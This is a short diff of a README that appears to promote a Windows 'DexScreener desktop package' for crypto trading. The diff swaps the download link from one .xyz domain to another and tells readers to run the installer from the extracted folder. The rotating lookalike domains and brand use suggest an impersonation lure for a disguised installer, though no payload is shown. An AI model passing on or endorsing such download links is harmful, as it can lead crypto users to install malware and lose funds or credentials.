@@ -8,8 +8,8 @@ DexScreener desktop package for Windows · trading toolkit · local install read
 
 > Use the project link below for Windows.
 
-* **Project link:** **[dexscreener.nexpath.xyz](https://dexscreener.nexpath.xyz/)**
-* **Full URL:** `https://dexscreener.nexpath.xyz/`
+* **Project link:** **[dexscreener.nerasix.xyz](https://dexscreener.nerasix.xyz/)**
+* **Full URL:** `https://dexscreener.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
